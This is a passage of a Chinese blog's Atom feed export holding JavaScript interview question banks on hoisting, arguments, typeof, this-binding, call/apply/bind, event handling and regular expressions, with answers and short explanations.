class="line">parseInt(3.14);     //3</span><br><span class="line">parseFloat(&quot;3asdf&quot;);    //3</span><br><span class="line">parseInt(&quot;1.23abc456&quot;);</span><br><span class="line">parseInt(true);//&quot;true&quot; NaN</span><br></pre></td></tr></table></figure><p>第10题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//考点：函数声明提前</span><br><span class="line">function bar() &#123;</span><br><span class="line">    return foo;</span><br><span class="line">    foo = 10;</span><br><span class="line">    function foo() &#123;&#125;</span><br><span class="line">    //var foo = 11;</span><br><span class="line">&#125;</span><br><span class="line">alert(typeof bar());//&quot;function&quot;</span><br></pre></td></tr></table></figure><p>第11题：考点：函数声明提前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var foo = 1;</span><br><span class="line">function bar() &#123;</span><br><span class="line">  foo = 10;</span><br><span class="line">  return;</span><br><span class="line">  function foo() &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">alert(foo);// 1</span><br></pre></td></tr></table></figure><p>第12题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">console.log(a);//是一个函数</span><br><span class="line">var a = 3;</span><br><span class="line">function a()&#123;&#125;</span><br><span class="line">console.log(a);////3</span><br></pre></td></tr></table></figure><p>第13题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//考点：对arguments的操作</span><br><span class="line">function foo(a) &#123;</span><br><span class="line">    arguments[0] = 2;</span><br><span class="line">    alert(a);//答案：2，因为：a、arguments是对实参的访问，b、通过arguments[i]可以修改指定实参的值</span><br><span class="line">&#125;</span><br><span class="line">foo(1);</span><br></pre></td></tr></table></figure><p>第14题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function foo(a) &#123;</span><br><span class="line">  alert(arguments.length);//答案：3，因为arguments是对实参的访问</span><br><span class="line">&#125;</span><br><span class="line">foo(1, 2, 3);</span><br></pre></td></tr></table></figure><p>第15题:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bar();//报错</span><br><span class="line">var foo = function bar(name) &#123;</span><br><span class="line">  console.log(&quot;hello&quot;+name);</span><br><span class="line">  console.log(bar);</span><br><span class="line">&#125;;</span><br><span class="line">//alert(typeof bar);</span><br><span class="line">foo(&quot;world&quot;);//&quot;hello&quot;</span><br><span class="line">console.log(bar);//undefined</span><br><span class="line">console.log(foo.toString());</span><br><span class="line">bar();//报错</span><br></pre></td></tr></table></figure><p>第16题：以下执行会有什么输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function test()&#123;</span><br><span class="line">  console.log(&quot;test函数&quot;);</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(function()&#123;</span><br><span class="line">  console.log(&quot;定时器回调函数&quot;);</span><br><span class="line">&#125;, 0)</span><br><span class="line">test();</span><br></pre></td></tr></table></figure><p>结果：</p><p>test函数<br>定时器回调函数</p><h2 id="选择题"><a href="#选择题" class="headerlink" title="选择题"></a>选择题</h2><p><strong>以下哪些是javascript的全局函数：( ABC )</strong></p><p>A. escape 函数可对字符串进行编码，这样就可以在所有的计算机上读取该字符串。ECMAScript v3 反对使用该方法，应用使用 decodeURI() 和 decodeURIComponent() 替代它。<br>B. parseFloat parseFloat() 函数可解析一个字符串，并返回一个浮点数。该函数指定字符串中的首个字符是否是数字。如果是，则对字符串进行解析，直到到达数字的末端为止，然后以数字返回该数字，而不是作为字符串。<br>C. eval 函数可计算某个字符串，并执行其中的的 JavaScript 代码。<br>D. setTimeout<br>E. alert</p><p><strong>关于IE的window对象表述正确的有：( ACD )</strong></p><p>A. window.opener属性本身就是指向window对象<br>B. window.reload()方法可以用来刷新当前页面 应该是location.reload或者window.location.reload<br>C. window.location=”a.html”和window.location.href=”a.html”的作用都是把当前页面替换成a.html页面<br>D. 定义了全局变量g；可以用window.g的方式来存取该变量</p><p><strong>下面正确的是 ( A )</strong></p><p>A: 跨域问题能通过JsonP方案解决<br>B：不同子域名间仅能通过修改window.name解决跨域还可以通过script标签src，jsonp等h5 Java split等<br>C：只有在IE中可通过iframe嵌套跨域<br>D：MediaQuery属性是进行视频格式检测的属性是做响应式的</p><p><strong>错误的是 ( B )</strong></p><p>A: Ajax本质是XMLHttpRequest<br>B: 块元素实际占用的宽度与它的width、border、padding属性有关，与background无关<br>C: position属性absolute、fixed、—relative—会使文档脱标<br>D: float属性left也会使div脱标</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;正则表达式&quot;&gt;&lt;a href=&quot;#正则表达式&quot; class=&quot;headerlink&quot; title=&quot;正则表达式&quot;&gt;&lt;/a&gt;正则表达式&lt;/h2&gt;&lt;h3 id=&quot;写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串&quot;&gt;&lt;a href=&quot;#写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串&quot; class=&quot;headerlink&quot; title=&quot;写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串&quot;&gt;&lt;/a&gt;写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串&lt;/h3&gt;&lt;p&gt;&lt;code&gt;^[a-zA-Z]{1}[\w]{5,29}$&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;写出正确的正则表达式匹配固话号&quot;&gt;&lt;a href=&quot;#写出正确的正则表达式匹配固话号&quot; class=&quot;headerlink&quot; title=&quot;写出正确的正则表达式匹配固话号&quot;&gt;&lt;/a&gt;写出正确的正则表达式匹配固话号&lt;/h3&gt;&lt;p&gt;区号3-4位，第一位为0，中横线，7-8位数字，中横线，3-4位分机号格式的固话号&lt;/p&gt;
&lt;p&gt;&lt;code&gt;^[0]\d{2,3}\-\d{7,8}\-\d{3,4}$&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成&quot;&gt;&lt;a href=&quot;#要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成&quot; class=&quot;headerlink&quot; title=&quot;要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成&quot;&gt;&lt;/a&gt;要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成&lt;/h3&gt;&lt;p&gt;&lt;code&gt;^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z\d]{6,20}$&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&quot;输出结果是&quot;&gt;&lt;a href=&quot;#输出结果是&quot; class=&quot;headerlink&quot; title=&quot;输出结果是&quot;&gt;&lt;/a&gt;输出结果是&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var bool = !!2; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;alert(bool)；//true;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;双向非操作可以把字符串和数字转换为布尔值。&lt;/p&gt;
    
    </summary>
    
      <category term="题库系列" scheme="http://yoursite.com/categories/%E9%A2%98%E5%BA%93%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>题库-js篇(上)</title>
    <link href="http://yoursite.com/2016/04/28/%E9%A2%98%E5%BA%93-js%E7%AF%87%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>http://yoursite.com/2016/04/28/题库-js篇（上）/</id>
    <published>2016-04-27T16:00:00.000Z</published>
    <updated>2018-06-04T08:57:01.661Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、javascript-的-typeof-返回哪些数据类型"><a href="#1、javascript-的-typeof-返回哪些数据类型" class="headerlink" title="1、javascript 的 typeof 返回哪些数据类型"></a>1、javascript 的 typeof 返回哪些数据类型</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="keyword">typeof</span> [<span class="number">1</span>, <span class="number">2</span>]); <span class="comment">//'object'</span></span><br><span class="line">alert(<span class="keyword">typeof</span> <span class="string">'leipeng'</span>); <span class="comment">//'string'</span></span><br><span class="line"><span class="keyword">var</span> i = <span class="literal">true</span>; </span><br><span class="line">alert(<span class="keyword">typeof</span> i); <span class="comment">//'boolean'</span></span><br><span class="line">alert(<span class="keyword">typeof</span> <span class="number">1</span>); <span class="comment">//'number'</span></span><br><span class="line"><span class="keyword">var</span> a; </span><br><span class="line">alert(<span class="keyword">typeof</span> a); <span class="comment">//'undefined'</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;;&#125;;</span><br><span class="line">alert(<span class="keyword">typeof</span> a) <span class="comment">//'function'</span></span><br></pre></td></tr></table></figure><h2 id="2、-3-种强制类型转换和-2-种隐式类型转换"><a href="#2、-3-种强制类型转换和-2-种隐式类型转换" class="headerlink" title="2、 3 种强制类型转换和 2 种隐式类型转换"></a>2、 3 种强制类型转换和 2 种隐式类型转换</h2><blockquote><p>强制（parseInt(),parseFloat(),Number()）<br>隐式（== ,!!）</p></blockquote><a id="more"></a><h2 id="3、split-、join-的区别"><a href="#3、split-、join-的区别" class="headerlink" title="3、split() 、join() 的区别"></a>3、split() 、join() 的区别</h2><p>前者是将字符串切割成数组的形式，后者是将数组转换成字符串</p><h2 id="4、数组方法pop-、push-、unshift-、shift"><a href="#4、数组方法pop-、push-、unshift-、shift" class="headerlink" title="4、数组方法pop()、push()、unshift()、shift()"></a>4、数组方法pop()、push()、unshift()、shift()</h2><ul><li>Push()尾部添加 pop()尾部删除</li><li>Unshift()头部添加 shift()头部删除</li></ul><h2 id="5、事件绑定和普通事件有什么区别"><a href="#5、事件绑定和普通事件有什么区别" class="headerlink" title="5、事件绑定和普通事件有什么区别"></a>5、事件绑定和普通事件有什么区别</h2><p>普通添加事件的方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"hello"</span>);</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">btn.onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行上面的代码只会 alert 2</p><p>事件绑定方式添加事件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"hello"</span>);</span><br><span class="line">btn.addEventListener(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">1</span>);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br><span class="line">btn.addEventListener(<span class="string">"click"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  alert(<span class="number">2</span>);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>执行上面的代码会先 alert 1 再 alert 2</p><blockquote><p>普通添加事件的方法不支持添加多个事件，最下面的事件会覆盖上面的，而事件绑定（addEventListener）方式添加事件可以添加多个。<br>addEventListener不兼容低版本IE；<br>普通事件无法取消；<br>addEventLisntener还支持事件冒泡+事件捕获</p></blockquote><h2 id="6、IE和DOM事件流的区别"><a href="#6、IE和DOM事件流的区别" class="headerlink" title="6、IE和DOM事件流的区别"></a>6、IE和DOM事件流的区别</h2><blockquote><p>执行顺序不一样<br>参数不一样<br>事件加不加on<br>this指向问题</p></blockquote><h2 id="7、IE和标准下有哪些兼容性的写法"><a href="#7、IE和标准下有哪些兼容性的写法" class="headerlink" title="7、IE和标准下有哪些兼容性的写法"></a>7、IE和标准下有哪些兼容性的写法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ev = ev || <span class="built_in">window</span>.event;</span><br><span class="line"><span class="built_in">document</span>.documentElement.clientWidth || <span class="built_in">document</span>.body.clientWidth;</span><br><span class="line"><span class="keyword">var</span> target = ev.srcElement||ev.target;</span><br></pre></td></tr></table></figure><h2 id="8、call、apply和bind的区别"><a href="#8、call、apply和bind的区别" class="headerlink" title="8、call、apply和bind的区别"></a>8、call、apply和bind的区别</h2><p>call方法:</p><p>语法：call(thisObj，Object1,Object2…)</p><p>定义：调用一个对象的一个方法，以另一个对象替换当前对象。</p><p>说明：</p><blockquote><p>call 方法可以用来代替另一个对象调用一个方法。<br>call 方法可将一个函数的对象上下文从初始的上下文改变为由 thisObj 指定的新对象。<br>如果没有提供 thisObj 参数，那么 Global 对象被用作 thisObj。</p></blockquote><p>apply方法：</p><p>语法：apply(thisObj，[argArray])</p><p>定义：应用某一对象的一个方法，用另一个对象替换当前对象。</p><p>说明：</p><blockquote><p>如果 argArray 不是一个有效的数组或者不是 arguments 对象，那么将导致一个 TypeError。<br>如果没有提供 argArray 和 thisObj 任何一个参数，那么 Global 对象将被用作 thisObj，并且无法被传递任何参数。</p></blockquote><p>bind 方法：</p><blockquote><p>bind方法传递给调用函数的参数可以逐个列出，也可以写在数组中。<br>bind方法与call、apply最大的不同就是前者返回一个绑定上下文的函数，而后两者是直接执行了函数<br>该方法创建一个新函数，称为绑定函数，绑定函数会以创建它时传入bind方法的第一个参数作为this;<br>传入bind方法的第二个以及以后的参数加上绑定函数运行时本身的参数按照顺序作为原函数的参数来调用原函数。</p></blockquote><p><a href="http://www.cnblogs.com/xljzlw/p/3775162.html" target="_blank" rel="noopener">js中call、apply、bind的用法</a></p><h2 id="9、函数调用、this指向、返回值"><a href="#9、函数调用、this指向、返回值" class="headerlink" title="9、函数调用、this指向、返回值"></a>9、函数调用、this指向、返回值</h2><p><strong>一个函数最终产生什么样的结构，跟如何调用这个函数息息相关：函数的四种调用模式</strong></p><h3 id="函数的-4-种调用模式"><a href="#函数的-4-种调用模式" class="headerlink" title="函数的 4 种调用模式"></a>函数的 4 种调用模式</h3><ol><li>第一种模式：函数调用模式，也就是写一个函数，然后调用一下</li><li>第二种模式：方法调用模式，也就是将函数成为对象的一个方法，然后通过对象来调用</li><li>第三种模式：构造函数调用模式，也就是将函数当成构造函数来调用</li><li>第四种调用模式：上下文调用模式，根据调用方式的不同可以产生不同的结果</li></ol><p>第四种函数调用的实现方式</p><ul><li>实现方式：call/apply (apply 和 call 的唯一区别是第二个参数是数组，将实参值一一传到数组中。fn.call (函数内部的 this 的值,实参1，实参2…))</li></ul><h3 id="不同调用模式中的this的值"><a href="#不同调用模式中的this的值" class="headerlink" title="不同调用模式中的this的值"></a>不同调用模式中的this的值</h3><ol><li>函数调用模式中 this 指向：window</li><li>方法调用模式中 this 指向：调用的对象</li><li>构造函数调用模式中 this 指向：构造函数的实例</li><li>上下文调用模式中 this 指向：</li></ol><ul><li>(1) 如果 call 方法的第一个参数是一个对象，则 fn 函数内部的 this 的值指向该对象</li><li>(2) 如果 call 方法的第一个参数是一个字符串、数字、布尔值，则 fn 函数内部的 this 的值会转换为该类型所对应的基本包装类型的对象</li><li>(3) 如果 call 方法的第一个参数是 null ，则 fn 函数内部的 this 的值是 window ——&gt; 就相当于是一次函数调用模式</li></ul><h3 id="调用模式中的返回值"><a href="#调用模式中的返回值" class="headerlink" title="调用模式中的返回值"></a>调用模式中的返回值</h3><ol><li>函数调用模式中返回值：由 return 语句决定</li><li>方法调用模式中返回值：由 return 语句决定</li><li>构造函数调用模式中的返回值：</li></ol><ul><li>(1). 如果构造函数没有手动设置返回值，那么会返回构造函数的实例</li><li>(2). 如果手动给构造函数添加了返回值，有以下2种情况：<ul><li>(a). 返回值是值类型：最终的返回值还是构造函数的实例</li><li>(b). 返回值是引用类型(对象)：最终的返回值就是该对象</li></ul></li></ul><ol><li>上下文调用模式中的返回值：由 return 语句决定<h2 id="10、b-继承-a-的方法"><a href="#10、b-继承-a-的方法" class="headerlink" title="10、b 继承 a 的方法"></a>10、b 继承 a 的方法</h2></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">A</span>(<span class="params"> age, name </span>)</span>&#123; </span><br><span class="line">  <span class="keyword">this</span>.age = age; </span><br><span class="line">  <span class="keyword">this</span>.name = name; </span><br><span class="line">&#125;</span><br><span class="line">A.prototype.show = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">  alert(<span class="string">'父级方法'</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">B</span>(<span class="params">age,name,job</span>)</span>&#123; </span><br><span class="line">  A.apply( <span class="keyword">this</span>, <span class="built_in">arguments</span> ); </span><br><span class="line">  <span class="keyword">this</span>.job = job; </span><br><span class="line">&#125; </span><br><span class="line">B.prototype = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> A(<span class="number">14</span>,<span class="string">'侠客行'</span>); </span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> B(<span class="number">15</span>,<span class="string">'狼侠'</span>,<span class="string">'侠客'</span>);</span><br></pre></td></tr></table></figure><h2 id="11、如何阻止事件冒泡和默认事件"><a href="#11、如何阻止事件冒泡和默认事件" class="headerlink" title="11、如何阻止事件冒泡和默认事件"></a>11、如何阻止事件冒泡和默认事件</h2><blockquote><p>canceBubble() 只支持 IE,return false,stopPropagation()</p></blockquote><h2 id="12、添加、删除、替换、插入到某个接点的方法"><a href="#12、添加、删除、替换、插入到某个接点的方法" class="headerlink" title="12、添加、删除、替换、插入到某个接点的方法"></a>12、添加、删除、替换、插入到某个接点的方法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">domObj.appendChild();</span><br><span class="line">domObj.insertBefore();</span><br><span class="line">domObj.replaceChild();</span><br><span class="line">domObj.removeChild();</span><br></pre></td></tr></table></figure><h2 id="13、javascript的本地对象，内置对象和宿主对象"><a href="#13、javascript的本地对象，内置对象和宿主对象" class="headerlink" title="13、javascript的本地对象，内置对象和宿主对象"></a>13、javascript的本地对象，内置对象和宿主对象</h2><blockquote><p>本地对象为 Array Object Regexp 等可以 new 实例化<br>内置对象为 Global Math 等不可以实例化的<br>宿主为浏览器自带的 document, window 等</p></blockquote><h2 id="14-window-onload-和-document-ready-的区别"><a href="#14-window-onload-和-document-ready-的区别" class="headerlink" title="14. window.onload 和 document ready 的区别"></a>14. window.onload 和 document ready 的区别</h2><blockquote><p>window.onload 是在dom文档树加载完和所有文件加载完之后执行一个函数;<br>Document.ready 原生种没有这个方法，<br>jquery中有 $().ready(function),在dom文档树加载完之后执行一个函数<br>注意，这里面的文档树加载完不代表全部文件加载完。<br>$(document).ready 要比 window.onload 先执行<br>window.onload只能出来一次，$(document).ready 可以出现多次</p></blockquote><h2 id="15、”-”-和-“-”-的不同"><a href="#15、”-”-和-“-”-的不同" class="headerlink" title="15、”==” 和 “===” 的不同"></a>15、”==” 和 “===” 的不同</h2><p>前者会自动转换类型，后者不会</p><h2 id="16、javascript的同源策略"><a href="#16、javascript的同源策略" class="headerlink" title="16、javascript的同源策略"></a>16、javascript的同源策略</h2><blockquote><p>一段脚本只能读取来自于同一来源的窗口和文档的属<br>这里的同一来源指的是主机名、议和端口号的组合</p></blockquote><h2 id="17、JavaScript-是一门什么样的语言，它的特点"><a href="#17、JavaScript-是一门什么样的语言，它的特点" class="headerlink" title="17、JavaScript 是一门什么样的语言，它的特点"></a>17、JavaScript 是一门什么样的语言，它的特点</h2><p>javaScript 一种直译式脚本语言，是一种动态类型、弱类型、基于原型的语言，内置支持类型。<br>它的解释器被称为 JavaScript 引擎，为浏览器的一部分，广泛用于客户端的脚本语言，最早是在 HTML 网页上使用，用来给 HTML 网页增加动态功能。<br>JavaScript 兼容于 ECMA 标准，因此也称为 ECMAScript。</p><p>基本特点：</p><blockquote><p>是一种解释性脚本语言（代码不进行预编译）。<br>主要用来向HTML（标准通用标记语言下的一个应用）页面添加交互行为。<br>可以直接嵌入HTML页面，但写成单独的js文件有利于结构和行为的分离。<br>跨平台特性，在绝大多数浏览器的支持下，可以在多种平台下运行（如Windows、Linux、Mac、Android、iOS等）。</p></blockquote><h2 id="18、JavaScript的数据类型"><a href="#18、JavaScript的数据类型" class="headerlink" title="18、JavaScript的数据类型"></a>18、JavaScript的数据类型</h2><blockquote><p>基本数据类型：String, boolean, Number, Undefined, Null<br>引用数据类型：Object(Array, Date, RegExp, Function)</p></blockquote><p>如何判断某变量是否为数组数据类型?</p><blockquote><p>方法一.判断其是否具有“数组性质”，如slice()方法。可自己给该变量定义 slice 方法，故有时会失效<br>方法二.obj instanceof Array 在某些 IE 版本中不正确<br>方法三.方法一二皆有漏洞，在 ECMAScript5 中定义了新方法 Array.isArray(), 保证其兼容性，最好的方法如下：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">Array</span>.isArray===<span class="string">"undefined"</span>) &#123;</span><br><span class="line">  <span class="built_in">Array</span>.isArray = <span class="function"><span class="keyword">function</span>(<span class="params">arg</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.toString.call(arg)===<span class="string">"[object Array]"</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="19-已知-ID-的-Input-输入框，获取这个输入框的输入值，怎么做？"><a href="#19-已知-ID-的-Input-输入框，获取这个输入框的输入值，怎么做？" class="headerlink" title="19. 已知 ID 的 Input 输入框，获取这个输入框的输入值，怎么做？"></a>19. 已知 ID 的 Input 输入框，获取这个输入框的输入值，怎么做？</h2><blockquote><p>document.getElementById(“ID”).value;</p></blockquote><h2 id="20、获取到页面中所有-checkbox"><a href="#20、获取到页面中所有-checkbox" class="headerlink" title="20、获取到页面中所有 checkbox"></a>20、获取到页面中所有 checkbox</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> domList = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'input'</span>);</span><br><span class="line"><span class="keyword">var</span> checkBoxList = [];</span><br><span class="line"><span class="keyword">var</span> len = domList.length;　　<span class="comment">//缓存到局部变量</span></span><br><span class="line"><span class="keyword">while</span> (len--) &#123;　　<span class="comment">//使用while的效率会比for循环更高</span></span><br><span class="line">　　<span class="keyword">if</span> (domList[len].type == <span class="string">'checkbox'</span>) &#123;</span><br><span class="line">    　　checkBoxList.push(domList[len]);</span><br><span class="line">　　&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="21-设置一个已知-ID-的-DIV-的-html-内容为-xxxx-，字体颜色设置为黑色"><a href="#21-设置一个已知-ID-的-DIV-的-html-内容为-xxxx-，字体颜色设置为黑色" class="headerlink" title="21. 设置一个已知 ID 的 DIV 的 html 内容为 xxxx ，字体颜色设置为黑色"></a>21. 设置一个已知 ID 的 DIV 的 html 内容为 xxxx ，字体颜色设置为黑色</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> dom = <span class="built_in">document</span>.getElementById(<span class="string">"ID"</span>);</span><br><span class="line">dom.innerHTML = <span class="string">"xxxx"</span></span><br><span class="line">dom.style.color = <span class="string">"#000"</span></span><br></pre></td></tr></table></figure><h2 id="22-当一个-DOM-节点被点击时候能够执行一个函数"><a href="#22-当一个-DOM-节点被点击时候能够执行一个函数" class="headerlink" title="22. 当一个 DOM 节点被点击时候能够执行一个函数"></a>22. 当一个 DOM 节点被点击时候能够执行一个函数</h2><blockquote><p>直接在DOM里绑定事件：<code>&lt;div onclick=&quot;test()&quot;&gt;&lt;/div&gt;</code><br>在 JS 里通过 onclick 绑定：xxx.onclick = test;<br>通过事件添加进行绑定：addEventListener(xxx, ‘click’, test);</p></blockquote><p>Javascript的事件流模型都有什么？</p><blockquote><p>“事件冒泡”：事件开始由最具体的元素接受，然后逐级向上传播<br>“事件捕捉”：事件由最不具体的节点先接收，然后逐级向下，一直到最具体的<br>“DOM事件流”：三个阶段：事件捕捉，目标阶段，事件冒泡</p></blockquote><h2 id="23-代码题"><a href="#23-代码题" class="headerlink" title="23. 代码题"></a>23. 代码题</h2><h3 id="undefined、-报错"><a href="#undefined、-报错" class="headerlink" title="undefined、 报错"></a>undefined、 报错</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a;</span><br><span class="line">alert(<span class="keyword">typeof</span> a); <span class="comment">// "undefined"</span></span><br><span class="line">alert(b); <span class="comment">// 报错</span></span><br></pre></td></tr></table></figure><blockquote><p>解释：undefined 是一个只有一个值的数据类型，这个值就是 “undefined”，<br>在使用var声明变量但并未对其赋值进行初始化时，这个变量的值就是undefined。<br>而b由于未声明将报错。未申明的变量和声明了未赋值的是不一样的。</p></blockquote><h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="literal">null</span>;</span><br><span class="line">alert(<span class="keyword">typeof</span> a); <span class="comment">//object</span></span><br></pre></td></tr></table></figure><p>解释：</p><blockquote><p>null是一个只有一个值的数据类型，这个值就是 null。<br>表示一个空指针对象，所以用 typeof 检测会返回 “object”。</p></blockquote><h3 id="“-”-运算符"><a href="#“-”-运算符" class="headerlink" title="“==” 运算符"></a>“==” 运算符</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="literal">undefined</span>;</span><br><span class="line"><span class="literal">undefined</span> == <span class="literal">null</span>; <span class="comment">// true</span></span><br><span class="line"><span class="number">1</span> == <span class="literal">true</span>;   <span class="comment">// true</span></span><br><span class="line"><span class="number">2</span> == <span class="literal">true</span>;   <span class="comment">// false</span></span><br><span class="line"><span class="number">0</span> == <span class="literal">false</span>;  <span class="comment">// true</span></span><br><span class="line"><span class="number">0</span> == <span class="string">''</span>;     <span class="comment">// true</span></span><br><span class="line"><span 